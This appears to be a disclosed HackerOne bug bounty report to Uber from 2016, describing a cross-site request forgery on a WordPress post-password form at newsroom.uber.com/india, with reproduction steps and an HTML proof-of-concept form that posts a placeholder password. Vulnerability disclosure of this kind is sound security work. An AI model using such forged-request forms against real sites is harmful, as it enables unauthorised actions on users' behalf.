@@ -1,0 +1,51 @@
+ReportLink:https://hackerone.com/reports/144147
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/mefkan
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.07.2016 23:19:42
+
+Summary:
+
+Hi,
+
+The link that exists CSRF vulnerability 
+
+https://newsroom.uber.com/india/how-to-refer/
+
+
+Attack details
+
+Form name: Empty
+Form action: https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog
+Form method: POST
+
+Reproduction Steps
+
+1-Create a file named submit.html
+
+2-Write this code to file
+
+<html>
+
+  <body>
+    <form action="https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog" method="POST">
+      <input type="hidden" name="post&#95;password" value="xxxxxxx" />
+      <input type="hidden" name="Submit" value="Enter" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+3-Then open the file with a browser click the Submit request button
+
+NOTE:
+
+It is an example so I didn't use a real value as you can see I used xxxxx you can change it to numbers.
+
+I added the submit.html file to attachments.
+
+Best regards...
